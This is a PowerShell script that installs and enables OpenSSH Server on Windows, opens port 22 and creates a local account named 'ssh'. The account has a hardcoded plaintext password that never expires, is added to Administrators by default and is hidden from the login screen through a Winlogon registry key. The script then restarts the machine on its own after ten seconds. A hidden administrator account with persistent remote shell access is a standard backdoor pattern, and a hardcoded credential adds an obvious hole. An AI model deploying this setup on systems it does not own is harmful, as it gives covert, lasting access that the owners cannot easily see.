$ErrorActionPreference = "Stop"

# --- Configuration ---
$Username = "ssh"
$GrantAdmin = $true # Set to $false for a standard non-admin user

# 1. Install OpenSSH Server if not already present (Fast .msi bypasses slow Windows Update)
Write-Host "[1/4] Checking OpenSSH Server..." -ForegroundColor Cyan
$sshCap = Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH.Server*'
$sshdService = Get-Service -Name sshd -ErrorAction SilentlyContinue

if ($sshCap.State -ne 'Installed' -and -not $sshdService) {
    Write-Host "Downloading and silently installing OpenSSH Server (.msi)..." -ForegroundColor Yellow
    $msiPath = "$env:TEMP\OpenSSH-Win64.msi"
    
    # Fetch latest Win64 .msi release from Microsoft's Win32-OpenSSH repo
    $release = Invoke-RestMethod -Uri "https://api.github.com/repos/PowerShell/Win32-OpenSSH/releases/latest"
    $asset = $release.assets | Where-Object { $_.name -like "*Win64*.msi" } | Select-Object -First 1
    
    Invoke-WebRequest -Uri $asset.browser_download_url -OutFile $msiPath
    Start-Process msiexec.exe -ArgumentList "/i `"$msiPath`" /qn /norestart ADDLOCAL=Server" -Wait
    Remove-Item $msiPath -Force
} else {
    Write-Host "OpenSSH Server is already installed." -ForegroundColor Green
}

# 2. Set sshd to Automatic BEFORE starting it
Write-Host "[2/4] Enabling persistent sshd service..." -ForegroundColor Cyan
Set-Service -Name sshd -StartupType 'Automatic'
try {
    Start-Service sshd -ErrorAction Stop
} catch {
    Write-Host "sshd failed to start. Checking OpenSSH diagnostics..." -ForegroundColor Red
    $sshdExe = if (Test-Path "$env:ProgramFiles\OpenSSH\sshd.exe") {
        "$env:ProgramFiles\OpenSSH\sshd.exe"
    } else {
        "$env:WINDIR\System32\OpenSSH\sshd.exe"
    }
    & $sshdExe -t
    Get-WinEvent -LogName "OpenSSH/Operational" -MaxEvents 5 -ErrorAction SilentlyContinue | Format-Table TimeCreated, Message -Wrap
    throw
}

# 3. Ensure Firewall allows inbound SSH on TCP port 22
Write-Host "[3/4] Configuring Windows Firewall..." -ForegroundColor Cyan
if (!(Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyContinue)) {
    New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' `
        -DisplayName 'OpenSSH Server (sshd)' `
        -Enabled True `
        -Direction Inbound `
        -Protocol TCP `
        -Action Allow `
        -LocalPort 22 | Out-Null
} else {
    Enable-NetFirewallRule -Name "OpenSSH-Server-In-TCP"
}

# 4. Create the SSH user
Write-Host "[4/4] Creating local user '$Username'..." -ForegroundColor Cyan
# $SecurePassword = ConvertTo-SecureString $PasswordPlain -AsPlainText -Force
$SecurePassword = ConvertTo-SecureString '~35Pheonix~35' -AsPlainText -Force

if (!(Get-LocalUser -Name $Username -ErrorAction SilentlyContinue)) {
    New-LocalUser -Name $Username `
        -Password $SecurePassword `
        -FullName "Remote" `
        -Description "Dedicated SSH access account" `
        -PasswordNeverExpires | Out-Null
} else {
    Set-LocalUser -Name $Username -Password $SecurePassword
}

# Add to Users or Administrators group
$TargetGroup = if ($GrantAdmin) { "Administrators" } else { "Users" }
try {
    Add-LocalGroupMember -Group $TargetGroup -Member $Username -ErrorAction Stop
} catch {
    # Ignore if user is already a member of the group
}

# Hide the user from the Windows login screen while keeping SSH active
$HideRegPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
if (!(Test-Path $HideRegPath)) {
    New-Item -Path $HideRegPath -Force | Out-Null
}
New-ItemProperty -Path $HideRegPath -Name $Username -Value 0 -PropertyType DWord -Force | Out-Null

# Optional: Set PowerShell as the default SSH shell instead of cmd.exe
if (!(Test-Path "HKLM:\SOFTWARE\OpenSSH")) {
    New-Item -Path "HKLM:\SOFTWARE\OpenSSH" -Force | Out-Null
}
New-ItemProperty -Path "HKLM:\SOFTWARE\OpenSSH" -Name DefaultShell `
    -Value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" `
    -PropertyType String -Force | Out-Null

# Print local IPv4 addresses for quick connection testing
$IPs = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" -and $_.IPAddress -notlike "169.254.*" }).IPAddress
Write-Host "`nDone! SSH is active and persistent." -ForegroundColor Green
Write-Host "Connect using: ssh $Username@$($IPs -join ' or ')" -ForegroundColor Green



Write-Host "`n====================================" -ForegroundColor Cyan
Write-Host "        RESTART REQUIRED" -ForegroundColor Yellow
Write-Host "====================================" -ForegroundColor Cyan

# /C YN = Choices Yes/No
# /D Y  = Default to 'Y' if no key is pressed
# /T 10 = Wait 10 seconds before choosing the default
choice.exe /C YN /D Y /T 10 /M "Restart computer now? (Auto-restarting in 10 seconds)"

# $LASTEXITCODE is 1 for Y (or timeout), and 2 for N
if ($LASTEXITCODE -eq 1) {
    Write-Host "`nRestarting computer..." -ForegroundColor Yellow
    Restart-Computer -Force
}
else {
    Write-Host "`nRestart cancelled. Your SSH configuration is complete." -ForegroundColor Green
}